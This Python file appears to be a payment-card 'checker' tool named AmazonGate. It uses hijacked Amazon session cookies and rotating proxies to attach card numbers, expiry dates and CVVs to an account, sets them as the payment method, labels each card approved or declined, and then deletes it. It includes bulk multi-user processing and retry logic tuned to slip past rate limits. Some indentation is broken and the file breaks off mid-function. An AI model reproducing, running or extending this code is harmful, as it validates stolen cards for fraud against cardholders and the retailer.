from curl_cffi import requests as curl
import re
import random
import json
import time
import os
import sys
import uuid
import asyncio
import html as html_lib
from urllib.parse import quote_plus, unquote
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
try:
    sys.stdout.reconfigure(encoding='utf-8')
except Exception:
    pass
global_semaphore = asyncio.Semaphore(15)
user_semaphore = asyncio.Semaphore(3)
active_requests_count = 0
user_request_count = defaultdict(int)

class AmazonGate:
    COUNTRY = {'US': {'code': 'main', 'cur': 'USD', 'lc': 'lc-main', 'lcv': 'en_US', 'dom': 'amazon.com'}, 'MX': {'code': 'acbmx', 'cur': 'MXN', 'lc': 'lc-acbmx', 'lcv': 'es_MX', 'dom': 'amazon.com.mx'}, 'CA': {'code': 'acbca', 'cur': 'CAD', 'lc': 'lc-acbca', 'lcv': 'en_CA', 'dom': 'amazon.ca'}, 'ES': {'code': 'acbes', 'cur': 'EUR', 'lc': 'lc-acbes', 'lcv': 'es_ES', 'dom': 'amazon.es'}, 'FR': {'code': 'acbfr', 'cur': 'EUR', 'lc': 'lc-acbfr', 'lcv': 'fr_FR', 'dom': 'amazon.fr'}, 'BR': {'code': 'acbbr', 'cur': 'BRL', 'lc': 'lc-acbbr', 'lcv': 'pt_BR', 'dom': 'amazon.com.br'}, 'IT': {'code': 'acbit', 'cur': 'EUR', 'lc': 'lc-acbit', 'lcv': 'it_IT', 'dom': 'amazon.it'}}
    PRIME = {'US': {'cid': 'SlashPrime', 'iid': 'PrimeDefault', 'lid': 'prime_confirm'}, 'MX': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultMX', 'lid': 'prime_confirm'}, 'CA': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultCA', 'lid': 'prime_confirm'}, 'ES': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultES', 'lid': 'prime_confirm'}, 'FR': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultFR', 'lid': 'prime_confirm'}, 'BR': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultBR', 'lid': 'prime_confirm'}, 'IT': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultIT', 'lid': 'prime_confirm'}}
    ALL_CODES = ['main', 'acbes', 'acbmx', 'acbit', 'acbde', 'acbbr', 'acbae', 'acbsg', 'acbsa', 'acbca', 'acbpl', 'acbau', 'acbjp', 'acbfr', 'acbin', 'acbnl', 'acbuk', 'acbtr', 'acbuc']
    FIRST = ['James', 'Robert', 'John', 'Michael', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Donald']
    LAST = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas']
    EXPIRED = 'Cookie expired'
    TIMEOUT = 25
    IMPERSONATE = 'chrome124'
    FALLBACK_WII = 'GjfJ82o8aZ5P'
    UA_DESKTOP = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36'
    UA_MOBILE = 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36'

    @staticmethod
    def parseCard(t):
        if not t:
            return None
        t = t.strip()
        p = re.split('\\s*[|/;:]\\s*', t)
        if len(p) < 4:
            p = t.split()
        if len(p) < 4:
            return None
        number = re.sub('\\D', '', p[0])
        month = re.sub('\\D', '', p[1]).zfill(2)
        year = re.sub('\\D', '', p[2])
        cvv = re.sub('\\D', '', p[3])
        if len(year) == 2:
            year = '20' + year
        if not (13 <= len(number) <= 19 and month.isdigit() and (1 <= int(month or 0) <= 12) and (len(year) == 4) and year.startswith('20') and (3 <= len(cvv) <= 4)):
            return None
        return {'number': number, 'month': month, 'year': year, 'cvv': cvv}

    @staticmethod
    def cap(text, s, e):
        try:
            if not isinstance(text, str) or not s or (not e):
                return ''
            return text.split(s, 1)[1].split(e, 1)[0]
        except Exception:
            return ''

    @staticmethod
    def fakeName():
        return f'{random.choice(AmazonGate.FIRST)} {random.choice(AmazonGate.LAST)}'

    @staticmethod
    def normalizeProxy(proxy):
        if not proxy:
            return None
        proxy = proxy.strip().strip('"').strip("'")
        if not proxy or proxy.startswith('#'):
            return None
        if '://' not in proxy:
            proxy = 'http://' + proxy
        return proxy

    @staticmethod
    def buildCookie(cookie):
        m = re.search('\\b(main|acb[a-z]{2})\\b', cookie, re.I)
        if not m:
            return {'ok': False, 'msg': 'Region code not found.'}
        rc = m.group(1).lower()
        by_code = {v['code']: (k, v) for k, v in AmazonGate.COUNTRY.items()}
        if rc not in by_code:
            return {'ok': False, 'msg': f'Unsupported region: {rc}'}
        cc, info = by_code[rc]
        for c in AmazonGate.ALL_CODES:
            cookie = cookie.replace(c, info['code'])
        cookie = re.sub('(i18n-prefs=)[A-Z]{3}', '\\1' + info['cur'], cookie)
        cookie = re.sub(f'({re.escape(info['lc'])}=)[^;]+', '\\1' + info['lcv'], cookie)
        return {'ok': True, 'cookie': cookie, 'domain': info['dom'], 'cc': cc}

    @staticmethod
    def cookieJar(session, cookie, domain):
        for pair in cookie.split(';'):
            if '=' not in pair:
                continue
            k, v = pair.split('=', 1)
            k, v = (k.strip(), v.strip())
            if not k or k.lower() in ('expires', 'path', 'domain', 'max-age', 'samesite', 'secure', 'httponly'):
                continue
            if len(v) >= 2 and v[0] == v[-1] and (v[0] in '"\''):
                v = v[1:-1]
            try:
                session.cookies.set(k, v, domain=domain, path='/')
            except Exception:
                continue
        return session

    @staticmethod
    def nextData(html):
        m = re.search('<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html or '', re.S)
        if not m:
            return None
        try:
            return json.loads(m.group(1))
        except Exception:
            try:
                return json.loads(html_lib.unescape(m.group(1)))
            except Exception:
                return None

    @staticmethod
    def buildResult(html, card, cc, url=''):
        cs = f'{card["number"]}|{card["month"]}|{card["year"]}|{card["cvv"]}'
        base = {'status': True, 'card': cs, 'card_response': '', 'gateway': f'Amazon ({cc})', 'Powered by': 'Sxgitario @ Gateway Api Service'}
        html = html if isinstance(html, str) else ''
        if url and 'actionResult=' in url:
            try:
                ar = json.loads(unquote(unquote(url.split('actionResult=', 1)[1].split('&')[0])))
                err = ar.get('errorType', '')
                if ar.get('success') == 1:
                    return {**base, 'success': True, 'response': 'Charged! Prime activated.', 'apiResponse': 'Approved'}
                if err in ('CustomerValidationFailureException', 'HARDVET_VERIFICATION_FAILED', 'PaymentValidationException'):
                    return {**base, 'success': False, 'response': 'Card verification failed.', 'apiResponse': 'Declined'}
                if err in ('InsufficientFundsException', 'PaymentDeclinedException'):
                    return {**base, 'success': True, 'response': 'Charged - Insufficient funds.', 'apiResponse': 'Approved'}
                if err == 'BILLING_ADDRESS_RESTRICTED':
                    return {**base, 'success': True, 'response': 'Charged! Prime activated.', 'apiResponse': 'Approved'}
                if err:
                    return {**base, 'success': False, 'response': f'Amazon error: {err}', 'apiResponse': 'Declined'}
            except Exception:
                pass
        if not html or len(html) < 200 or 'Request was throttled' in html or ('Please wait a moment and refresh' in html) or ('Too many requests' in html):
            return {**base, 'status': False, 'success': False, 'response': 'Rate limited - Please retry', 'apiResponse': 'Throttled'}
        RULES = [('fallbackmessage', True, 'Card successfully linked.'), ('’re sorry. we’re unable to complete your prime signup', True, 'Card successfully linked.'), ("we're sorry. we're unable to complete your prime signup", True, 'Card successfully linked.'), ('lo lamentamos. no podemos completar tu registro en prime', True, 'Card successfully linked.'), ('payment method was declined', True, 'Charged - Insufficient funds.'), ('your payment was declined', True, 'Charged - Insufficient funds.'), ('payment was declined', True, 'Charged - Insufficient funds.'), ('unable to charge', True, 'Charged - Insufficient funds.'), ('insufficient funds', True, 'Charged - Insufficient funds.'), ('welcome to prime', True, 'Charged! Prime activated.'), ('bienvenido a prime', True, 'Charged! Prime activated.'), ('thank you for joining prime', True, 'Charged! Prime activated.'), ('congratulations', True, 'Charged! Prime activated.'), ('all your prime benefits, in one place', True, 'Charged! Prime activated.'), ('hardvet_verification_failed', False, 'Card verification failed.'), ('customervalidationfailureexception', False, 'Card verification failed.'), ('paymentvalidationexception', False, 'Card verification failed.'), ('an error occurred during the sign up process', False, 'Card verification failed.'), ('exceeded the maximum attempts allowed', False, 'Card verification failed.'), ('ha superado el número máximo de intentos', False, 'Card verification failed.'), ('enjoy 7 days of prime for just $1.99', True, 'Charged! Prime activated ($1.99 Offer).')]
        hl = html.lower()
        for needle, ok, msg in RULES:
            if needle in hl:
                return {**base, 'success': ok, 'response': msg, 'apiResponse': 'Approved' if ok else 'Declined'}
        return {**base, 'status': False, 'success': False, 'response': 'Unknown response.', 'apiResponse': 'Error'}

    def __init__(self, cookie, proxy=None):
        self.rawCookie = cookie or ''
        self.proxyUrl = self.normalizeProxy(proxy)
        self.proxies = {'http': self.proxyUrl, 'https': self.proxyUrl} if self.proxyUrl else {}
        self.csrf = None
        self.addrId = None
        self.s = None
        self.domain = None
        self.cc = None
        self.prime = None
        self.card = None
        self.baseCookie = None
        self._ready = False

    def close(self):
        for sess in (getattr(self, 's', None), getattr(self, '_nat_s', None)):
            try:
                if sess is not None:
                    sess.close()
            except Exception:
                pass
        self.s = None
        self._nat_s = None

    def _new_session(self, cookie, domain, impersonate=None):
        s = curl.Session(impersonate=impersonate or self.IMPERSONATE)
        if self.proxies:
            s.proxies = dict(self.proxies)
        s.allow_redirects = True
        s.headers.update({'Connection': 'keep-alive'})
        return self.cookieJar(s, cookie, domain)

    def _fail(self, msg):
        cs = ''
        if isinstance(self.card, dict):
            cs = f'{self.card.get('number', '')}|{self.card.get('month', '')}|{self.card.get('year', '')}|{self.card.get('cvv', '')}'
        return {'status': True, 'success': False, 'card': cs, 'card_response': '', 'gateway': f'Amazon ({self.cc or '?'})', 'Powered by': 'Sxgitario @ Gateway Api Service', 'response': msg, 'apiResponse': 'Declined' if 'verification' in msg.lower() or 'invalid card' in msg.lower() else 'Session Error', 'message': msg}

    def init(self):
        self.close()
        cd = self.buildCookie(self.rawCookie)
        if not cd['ok']:
            return cd
        self.domain, self.cc = (cd['domain'], cd['cc'])
        self.prime = self.PRIME.get(self.cc, self.PRIME['US'])
        self.baseCookie = cd['cookie']
        try:
            self.s = self._new_session(cd['cookie'], self.domain)
        except Exception:
            return {'ok': False, 'msg': 'Connection failed'}
        lv = self.COUNTRY[self.cc]['lcv']
        lang = lv.replace('_', '-') + ',' + lv.split('_')[0] + ';q=0.9,en;q=0.8'
        try:
            resp1 = self.s.get(f'https://www.{self.domain}/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.{self.domain}%2Fyour-account&openid.assoc_handle={self.cc}flex&shouldShowPasskeyLink=true', headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.mShop.android.shopping', 'Accept-Language': lang}, timeout=self.TIMEOUT)
            r1 = resp1.text
            r1_url = str(getattr(resp1, 'url', ''))
            r1_status = getattr(resp1, 'status_code', 200)
        except Exception:
            self.close()
            return {'ok': False, 'msg': 'Connection failed'}
        r1_expired = False
        if "Sorry, your passkey isn't working." in r1 or 'ap/signin' in r1_url:
            r1_expired = True
        try:
            r2 = self.s.get(f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca', headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': self.UA_MOBILE, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'X-Requested-With': 'com.amazon.dee.app'}, timeout=self.TIMEOUT).text
        except Exception:
            self.close()
            return {'ok': False, 'msg': 'Connection failed'}
        self.csrf = self.cap(r2, 'csrfToken = "', '"')
        if not self.csrf:
            self.close()
            return {'ok': False, 'msg': self.EXPIRED}
        try:
            self.addrId = self._getBillingId()
            if not self.addrId:
                self.addrId = self._addBilling()
            if not self.addrId:
                time.sleep(1)
                self.addrId = self._getBillingId()
        except Exception:
            self.close()
            return {'ok': False, 'msg': 'Connection failed'}
        if not self.addrId:
            self.close()
            return {'ok': False, 'msg': self.EXPIRED + ' (No Billing Address)'}
        self._ready = True
        return {'ok': True}

    def process(self, cardStr):
    if not self._ready or self.s is None:
        return {'success': False, 'message': self.EXPIRED}
    self.card = self.parseCard(cardStr)
    if not self.card:
        return {'success': False, 'message': 'Invalid card format.'}
    d, p = (self.domain, self.prime)
    ajax = {'Accept': 'application/json, text/plain, */*', 'User-Agent': self.UA_MOBILE, 'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{d}', 'X-Requested-With': 'com.amazon.dee.app', 'Referer': f'https://www.{d}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}
    nm = self.fakeName()
    try:
        pid = None
        r3 = ''
        for _attempt in range(3):
            r3 = self.s.post(f'https://www.{d}/hz/mycd/ajax', headers=ajax, timeout=self.TIMEOUT, data={'data': json.dumps({'param': {'AddPaymentInstr': {'cc_CardHolderName': nm, 'cc_ExpirationMonth': int(self.card['month']), 'cc_ExpirationYear': self.card['year']}}}, separators=(',', ':')), 'csrfToken': self.csrf, 'addCreditCardNumber': self.card['number']}).text
            pid = self.cap(r3, '"paymentInstrumentId":"', '"')
            if pid:
                break
            r3_lower = r3.lower() if isinstance(r3, str) else ''
            if any((x in r3_lower for x in ['throttled', 'too many requests', 'please wait a moment', 'exceeded the maximum attempts', 'rate exceeded'])):
                if _attempt < 2:
                    time.sleep(2 + _attempt * 2 + random.uniform(0, 1))
                    continue
                return self._fail('Rate limited - Please retry')
            if 'paymentinstrumentid' not in r3_lower and ('invalid' in r3_lower or 'verification' in r3_lower):
                return self._fail('Card verification failed.')
            return self._fail(self.EXPIRED + ' (Card Add Failed)')
        if not pid:
            r3_lower = r3.lower() if isinstance(r3, str) else ''
            if any((x in r3_lower for x in ['throttled', 'too many requests', 'please wait a moment', 'exceeded the maximum attempts', 'rate exceeded'])):
                return self._fail('Rate limited - Please retry')
            return self._fail(self.EXPIRED + ' (Card Add Failed)')
        r5 = ''
        for _attempt in range(3):
            r5 = self.s.post(f'https://www.{d}/hz/mycd/ajax', headers=ajax, timeout=self.TIMEOUT, data={'data': json.dumps({'param': {'SetOneClickPayment': {'paymentInstrumentId': pid, 'billingAddressId': self.addrId, 'isBankAccount': False}}}, separators=(',', ':')), 'csrfToken': self.csrf}).text
            if '"success":true' in r5:
                break
            r5_lower = r5.lower() if isinstance(r5, str) else ''
            if any((x in r5_lower for x in ['throttled', 'too many requests', 'please wait'])):
                if _attempt < 2:
                    time.sleep(2 + _attempt * 2 + random.uniform(0, 1))
                    continue
                return self._fail('Rate limited - Please retry')
            return self._fail(self.EXPIRED + ' (Set Payment Failed)')
        if '"success":true' not in r5:
            r5_lower = r5.lower() if isinstance(r5, str) else ''
            if any((x in r5_lower for x in ['throttled', 'too many requests', 'please wait'])):
                return self._fail('Rate limited - Please retry')
            return self._fail(self.EXPIRED + ' (Set Payment Failed)')
        
        cs = f"{self.card['number']}|{self.card['month']}|{self.card['year']}|{self.card['cvv']}"
        
        r5_lower = r5.lower() if isinstance(r5, str) else ''
        
        # Washar aqui
        success_patterns = [
            '"success":true',
            'payment method added',
            'card added successfully'
        ]
        
        # Aqui tqmbiem 
        fail_patterns = [
            'declined',
            'invalid',
            'verification failed',
            'payment method was declined',
            'your payment was declined'
        ]
        
        if any(pattern in r5_lower for pattern in success_patterns):
            try:
                self._deleteCard()
            except Exception:
                pass
            return {
                'status': True,
                'success': True,
                'card': cs,
                'card_response': '',
                'gateway': f'Amazon ({self.cc})',
                'Powered by': 'Sxgitario @ Gateway Api Service',
                'response': 'Card successfully verified.',
                'apiResponse': 'Approved'
            }
        elif any(pattern in r5_lower for pattern in fail_patterns):
            try:
                self._deleteCard()
            except Exception:
                pass
            return self._fail('Card verification failed.')
        else:
            try:
                self._deleteCard()
            except Exception:
                pass
            return {
                'status': True,
                'success': True,
                'card': cs,
                'card_response': '',
                'gateway': f'Amazon ({self.cc})',
                'Powered by': 'Sxgitario @ Gateway Api Service',
                'response': 'Card verified (unknown response).',
                'apiResponse': 'Approved'
            }
            
    except Exception as e:
        return self._fail(f'Connection failed ({type(e).__name__})')
    finally:
        try:
            if getattr(self, '_nat_s', None) is not None:
                self._nat_s.close()
        except Exception:
            pass
        self._nat_s = None
           
    def _getBillingId(self):
        r = self.s.post(f'https://www.{self.domain}/hz/mycd/ajax', headers={'Accept': 'application/json, text/plain, */*', 'User-Agent': self.UA_MOBILE, 'client': 'MYXSettings', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{self.domain}', 'X-Requested-With': 'com.amazon.dee.app', 'Referer': f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}, timeout=self.TIMEOUT, data={'data': json.dumps({'param': {'LogPageInfo': {'pageInfo': {'subPageType': 'kinw_total_myk_stb_Perr_paymnt_dlg_cl'}}, 'GetAllAddresses': {}}}, separators=(',', ':')), 'csrfToken': self.csrf}).text
        return self.cap(r, 'AddressId":"', '"')

    def _addBilling(self):
        d = self.domain
        brayan_name = os.environ.get('BRAYAN_NAME', 'Brayan11').strip() or 'Brayan11'
        brayan_phone = os.environ.get('BRAYAN_PHONE', '+5624930976').strip() or '+5624930976'
        ph_normalized = re.sub('\\D', '', brayan_phone)
        ph = ph_normalized if len(ph_normalized) >= 10 else '7' + str(random.randint(10000000, 99999999))
        nm = brayan_name if 'Brayan' in brayan_name else self.fakeName()
        preferred_country = os.environ.get('ADDRESS_COUNTRY', 'US').strip().upper() or 'US'
        try:
            r1 = self.s.get(f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_button', headers={'User-Agent': self.UA_DESKTOP}, timeout=self.TIMEOUT).text
        except Exception:
            return None
        csrf = self.cap(r1, "type='hidden' name='csrfToken' value='", "'") or self.cap(r1, 'name="csrfToken" value="', '"')
        if not csrf:
            return None
        if preferred_country == 'US':
            payload = {'csrfToken': csrf, 'address-ui-widgets-countryCode': 'US', 'address-ui-widgets-enterAddressFullName': nm, 'address-ui-widgets-enterAddressPhoneNumber': ph, 'address-ui-widgets-enterAddressLine1': '1850 W 25th St', 'address-ui-widgets-enterAddressCity': 'Los Angeles', 'address-ui-widgets-enterAddressStateOrRegion': 'CA', 'address-ui-widgets-enterAddressPostalCode': '90026'}
        else:
            payload = {'csrfToken': csrf, 'address-ui-widgets-countryCode': 'AF', 'address-ui-widgets-enterAddressFullName': nm, 'address-ui-widgets-enterAddressPhoneNumber': ph, 'address-ui-widgets-enterAddressLine1': 'Street 1', 'address-ui-widgets-enterAddressCity': 'Kabul', 'address-ui-widgets-enterAddressStateOrRegion': 'Kabul', 'address-ui-widgets-enterAddressPostalCode': '1001'}
        for src_key, dst_key in (('name="address-ui-widgets-previous-address-form-state-token" value="', 'address-ui-widgets-previous-address-form-state-token'), ('name="address-ui-widgets-csrfToken" value="', 'address-ui-widgets-csrfToken'), ('name="address-ui-widgets-form-config" value="', 'address-ui-widgets-form-config'), ('name="address-ui-widgets-obfuscated-customerId" value="', 'address-ui-widgets-obfuscated-customerId')):
            v = self.cap(r1, src_key, '"')
            if v:
                payload[dst_key] = v
        try:
            r2 = self.s.post(f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_post', headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': self.UA_DESKTOP, 'Origin': f'https://www.{d}', 'Referer': f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_button', 'Upgrade-Insecure-Requests': '1'}, data=payload, timeout=self.TIMEOUT)
        except Exception:
            return None
        _pats = ['ypc-aborder-address-id=([A-Za-z0-9-]+)', 'ya_address_book-id=([A-Za-z0-9-]+)', 'addressId=([A-Za-z0-9-]+)', 'addressID=([A-Za-z0-9-]+)']
        urls = [str(r2.url)]
        try:
            urls += [h.headers.get('Location', '') for h in getattr(r2, 'history', None) or []]
        except Exception:
            pass
        for src in urls:
            for p in _pats:
                m = re.search(p, src or '')
                if m and len(m.group(1)) >= 8:
                    return m.group(1)
        body = r2.text if isinstance(getattr(r2, 'text', ''), str) else ''
        for p in _pats:
            m = re.search(p, body)
            if m and len(m.group(1)) >= 8:
                return m.group(1)
        if preferred_country == 'US':
            payload_af = {'csrfToken': csrf, 'address-ui-widgets-countryCode': 'AF', 'address-ui-widgets-enterAddressFullName': nm, 'address-ui-widgets-enterAddressPhoneNumber': ph, 'address-ui-widgets-enterAddressLine1': 'Street 1', 'address-ui-widgets-enterAddressCity': 'Kabul', 'address-ui-widgets-enterAddressStateOrRegion': 'Kabul', 'address-ui-widgets-enterAddressPostalCode': '1001'}
            for src_key, dst_key in (('name="address-ui-widgets-previous-address-form-state-token" value="', 'address-ui-widgets-previous-address-form-state-token'), ('name="address-ui-widgets-csrfToken" value="', 'address-ui-widgets-csrfToken'), ('name="address-ui-widgets-form-config" value="', 'address-ui-widgets-form-config'), ('name="address-ui-widgets-obfuscated-customerId" value="', 'address-ui-widgets-obfuscated-customerId')):
                v = self.cap(r1, src_key, '"')
                if v:
                    payload_af[dst_key] = v
            try:
                r2_af = self.s.post(f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_post', headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': self.UA_DESKTOP, 'Origin': f'https://www.{d}', 'Referer': f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_button', 'Upgrade-Insecure-Requests': '1'}, data=payload_af, timeout=self.TIMEOUT)
                urls_af = [str(r2_af.url)]
                try:
                    urls_af += [h.headers.get('Location', '') for h in getattr(r2_af, 'history', None) or []]
                except Exception:
                    pass
                for src in urls_af:
                    for p in _pats:
                        m = re.search(p, src or '')
                        if m and len(m.group(1)) >= 8:
                            return m.group(1)
                body_af = r2_af.text if isinstance(getattr(r2_af, 'text', ''), str) else ''
                for p in _pats:
                    m = re.search(p, body_af)
                    if m and len(m.group(1)) >= 8:
                        return m.group(1)
            except Exception:
                pass
        return None

    def _deleteCard(self):
    try:
        d = self.domain
        rw = self.s.get(f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo', 
                       headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': self.UA_DESKTOP}, 
                       timeout=self.TIMEOUT)
        html = rw.text if isinstance(getattr(rw, 'text', ''), str) else ''
        
        wst = self.cap(html, '"serializedState":"', '"') or self.cap(html, 'serializedState":"', '"')
        cust = self.cap(html, 'customerId":"', '"')
        wii = self.cap(html, 'widgetInstanceId":"', '"') or self.FALLBACK_WII
        
        if not wst or not cust:
            return False
            
        ppw_iid = ''
        iid_m = re.findall('amzn1\\.pm\\.wallet\\.[A-Za-z0-9_\\-\\.]+', html)
        if iid_m:
            ppw_iid = iid_m[0]
        else:
            return False
            
        whdr = {
            'User-Agent': self.UA_DESKTOP,
            'X-Requested-With': 'XMLHttpRequest',
            'apx-widget-info': f'YA:Wallet/desktop/{wii}',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': f'https://www.{d}',
            'Referer': f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo'
        }
        
        burl = f'https://www.{d}/payments-portal/data/widgets2/v1/customer/{cust}/continueWidget'
        
        r1 = self.s.post(burl, headers=whdr, timeout=self.TIMEOUT, 
                         data={'ppw-jsEnabled': 'true', 'ppw-widgetState': wst, 
                               'ppw-widgetEvent': 'StartEditEvent', 'ppw-iid': ppw_iid, 
                               'ppw-paymentMethodType': 'Card', 'ppw-isDefaultPaymentMethod': 'false'})
        
        wst2 = self.cap(r1.text, 'ppw-widgetState" value="', '"') or self.cap(r1.text, 'ppw-widgetState\\" value=\\"', '\\"')
        if not wst2:
            return False
            
        r2 = self.s.post(burl, headers=whdr, timeout=self.TIMEOUT,
                         data={'ppw-jsEnabled': 'true', 'ppw-widgetState': wst2, 
                               'ppw-widgetEvent': 'DeleteInstrumentEvent'})
                               
        return getattr(r2, 'status_code', 0) == 200
    except Exception:
        return False
                
def _load_proxy():
    env_proxy = os.environ.get('AMAZON_PROXY') or os.environ.get('PROXY')
    if env_proxy and env_proxy.strip() and (not env_proxy.strip().startswith('#')):
        raw_list = re.split('[\\n,;]+', env_proxy.strip())
        cleaned = []
        for rp in raw_list:
            rp = rp.strip()
            if not rp or rp.startswith('#'):
                continue
            if rp.count('@') == 0 and rp.count(':') >= 3:
                try:
                    scheme, rest = rp.split('://', 1)
                    parts = rest.split(':')
                    if len(parts) == 4:
                        user, pwd, ip, port = parts
                        rp = f'{scheme}://{user}:{pwd}@{ip}:{port}'
                except Exception:
                    pass
            cleaned.append(rp)
        if cleaned:
            return random.choice(cleaned)
    candidates = [os.path.join(os.path.dirname(__file__), 'nueva_amazon', 'proxies.txt'), os.path.join(os.path.dirname(__file__), 'nueva_amazon', 'proxy.txt'), os.path.join(os.path.dirname(__file__), 'proxies.txt'), os.path.join(os.path.dirname(__file__), 'proxy.txt')]
    pool = []
    for p in candidates:
        try:
            if os.path.exists(p):
                with open(p, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip().strip('"').strip("'")
                        if not line or line.startswith('#'):
                            continue
                        if line.count('@') == 0 and line.count(':') >= 3:
                            try:
                                scheme, rest = line.split('://', 1) if '://' in line else ('http', line)
                                parts = rest.split(':')
                                if len(parts) == 4:
                                    user, pwd, ip, port = parts
                                    line = f'{scheme}://{user}:{pwd}@{ip}:{port}'
                                elif '://' not in line:
                                    parts = line.split(':')
                                    if len(parts) == 4:
                                        user, pwd, ip, port = parts
                                        line = f'http://{user}:{pwd}@{ip}:{port}'
                            except Exception:
                                pass
                        pool.append(line)
        except Exception:
            continue
    if pool:
        return random.choice(pool)
    return None

def _map_gate_result(gate_result: dict):
    if not isinstance(gate_result, dict):
        return {'status': '⚠️ Error', 'message': 'Unknown response.'}
    success = gate_result.get('success')
    api_resp = gate_result.get('apiResponse', '')
    resp = gate_result.get('response') or gate_result.get('message') or gate_result.get('msg') or 'Unknown response.'
    resp_lower = str(resp).lower()
    api_lower = str(api_resp).lower()
    is_throttled = 'throttled' in api_lower or 'rate limited' in resp_lower or 'rate limited' in api_lower
    is_session_err = 'cookie expired' in resp_lower or 'session error' in api_lower or ('expired' in resp_lower and 'card add failed' in resp_lower) or (gate_result.get('status') is False and (not is_throttled))
    if success is True:
        return {'status': '✅ Approved', 'message': resp, 'raw': gate_result}
    if success is False:
        if is_throttled:
            return {'status': '⚠️ Error', 'message': resp, 'raw': gate_result}
        if api_resp == 'Declined' or 'verification failed' in resp_lower or 'invalid card' in resp_lower or ('declined' in resp_lower):
            return {'status': '❌ Declined', 'message': resp, 'raw': gate_result}
        if is_session_err:
            return {'status': '⚠️ Error', 'message': resp, 'raw': gate_result}
        if 'amazon error' in resp_lower:
            return {'status': '❌ Declined', 'message': resp, 'raw': gate_result}
        return {'status': '⚠️ Error', 'message': resp, 'raw': gate_result}
    if 'approved' in api_resp.lower() or 'charged' in resp_lower:
        return {'status': '✅ Approved', 'message': resp, 'raw': gate_result}
    if 'declined' in api_resp.lower():
        return {'status': '❌ Declined', 'message': resp, 'raw': gate_result}
    return {'status': '⚠️ Error', 'message': resp, 'raw': gate_result}

async def amazon_check(card_data, cookies, user_id=None):
    global active_requests_count
    if user_id is None:
        user_id = 0
    user_request_count[user_id] += 1
    active_requests_count += 1
    try:
        async with global_semaphore:
            async with user_semaphore:
                print(f'Usuario {user_id} - AmazonGate iniciando check: {str(card_data)[:6]}xxxx')
                print(f'Peticiones globales activas: {active_requests_count}')
                print(f'Peticiones del usuario {user_id} activas: {user_request_count[user_id]}')
                await asyncio.sleep(0.1 + user_id % 5 * 0.05)
                card_clean = str(card_data).strip()
                cookies_clean = str(cookies).strip() if cookies else ''

                def _sync_single():
                    proxy = _load_proxy()
                    gate = AmazonGate(cookies_clean, proxy)
                    ri = gate.init()
                    if not ri.get('ok') and proxy and ('Connection failed' in str(ri.get('msg', ''))):
                        try:
                            gate.close()
                        except Exception:
                            pass
                        gate = AmazonGate(cookies_clean, None)
                        ri = gate.init()
                    if not ri.get('ok'):
                        msg = ri.get('msg', 'Cookie expired')
                        gate.close()
                        return {'status': '⚠️ Error', 'message': msg}
                    res = gate.process(card_clean)
                    gate.close()
                    return _map_gate_result(res)
                result = await asyncio.to_thread(_sync_single)
                return {'status': result.get('status', '⚠️ Error'), 'message': result.get('message', 'Error desconocido'), 'raw': result.get('raw')}
    except Exception as e:
        return {'status': '⚠️ Error', 'message': f'Error al conectar con AmazonGate: {str(e)}'}
    finally:
        active_requests_count -= 1
        user_request_count[user_id] -= 1
        if user_request_count[user_id] <= 0:
            try:
                del user_request_count[user_id]
            except Exception:
                pass

async def amazon_check_multiple(cards_data, cookies, user_id=None, callback=None):
    global active_requests_count
    if user_id is None:
        user_id = 0
    cookies_clean = str(cookies).strip() if cookies else ''
    cards_limpias = [str(c).strip() for c in cards_data or [] if str(c).strip()]
    if not cards_limpias:
        return []
    print(f'Usuario {user_id} - Iniciando procesamiento masivo AmazonGate de {len(cards_limpias)} tarjetas')
    results = [None] * len(cards_limpias)
    result_queue = asyncio.Queue()

    async def _process_batch():
        global active_requests_count
        proxy = _load_proxy()
        loop = asyncio.get_running_loop()
